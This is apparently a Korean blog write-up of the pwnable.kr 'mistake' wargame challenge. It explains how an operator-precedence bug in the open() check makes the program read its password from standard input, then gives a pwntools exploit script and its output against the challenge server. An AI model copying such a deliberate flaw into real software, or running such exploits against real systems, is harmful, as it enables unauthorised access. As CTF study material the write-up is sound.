---
title: "[pwnable.kr] mistake"
published: 2026-09-30
description: Solving a wargame challenge
category: CTF
tags: [pwnable.kr, study]
draft: false
---

# mistake
이상하리만치 취약한 부분이 보이지 않았다.  
연산자 우선순위가 주제라니, 당황스럽다.  
프로그래밍기능사 필기에서 볼 것 같은 내용이었다. 그래도 익숙한 함수여서 다행이지 참;;  

너무 조건문을 대충대충 봤다. 유심히 봤다면 더 빨리 풀지 않았을까, 생각한다.  

# 코드 분석
```c
...
#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
	  ...
		system("/bin/cat flag\n");
	}
	else{
		...
	}

	close(fd);
	return 0;
}
```

## 부연 설명
의외로 중요한 부분만 남은 코드라 생략할 게 그다지 없었다. 아니면 내가 아직 바보인 걸지도..  
볼 수 있듯이 입력에선 문제가 없다. 첫 `if`문에서 오류가 생긴다.  
`if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)`.  

**연산자 우선순위**에 따르면 `비교 연산자`인 `<`가 `대입 연산자`인 `=`보다 우선시된다.  
따라서 `open()`의 반환값을 우선 알아야 한다.  

그래야 조건문이 어떻게 돌아갈 지 알겠지, `unix C`라 `man`으로 확인할 수 있는 건 다 알 거라 생각한다.  
궁금하면 아래 링크에 가서 봐도 될 듯  
`https://man7.org/linux/man-pages/man2/open.2.html`
대충 `fd`에는 3이 들어갈 것으로 보인다.  

`stdin`, `stdout`, `stderr`의 파일 디스크립터는 각각 0, 1, 2이기 때문이지,, 그냥 말하고 싶었다.  

어쨌거나, 그럼 `open()`은 3을, 못해도 0보다 큰 값을 반환할 것이고, 비교 후  
0보다 작지 않으므로 거짓을 넘기고, 결국 `if`문이 실행되지 않고 넘어가게 된다.  

# 풀이
앞선 내용을 정리하면 `pw_buf`에 우리가 원하는 원본 비번을 넣을 수 있고,  
비교에 포함될 `pw_buf2`의 값에도 그러한 값을 넣을 수 있다.  

+)  
다른 부분은 너무나 간단하여 딱히 설명하지 않았다.  

```py
from pwn import *
import time

context.binary = elf = ELF('./mistake')
context.log_level = 'info'

#p = process()
p = remote('pwnable.kr', 10008)

pass_ = b'BANKAI'.ljust(10, b'A')
pass_xor = bytearray(pass_)

for _ in range(len(pass_)):
	pass_xor[_] = pass_[_] ^ 1

log.info(f"pass_xor'ed: {pass_xor}")
log.info(f"pass: {pass_}")

time.sleep(20)

p.sendline(pass_xor)
p.sendlineafter(b': ', pass_)

p.interactive()
```

```bash
[*] '/home/bankai/pwnable.kr/mistake/mistake'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to pwnable.kr on port 10008: Done
[*] pass_xor'ed: bytearray(b'C@OJ@H@@@@')
[*] pass: b'BANKAIAAAA'
[*] Switching to interactive mode
Password OK
{대충검열}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to pwnable.kr port 10008
```
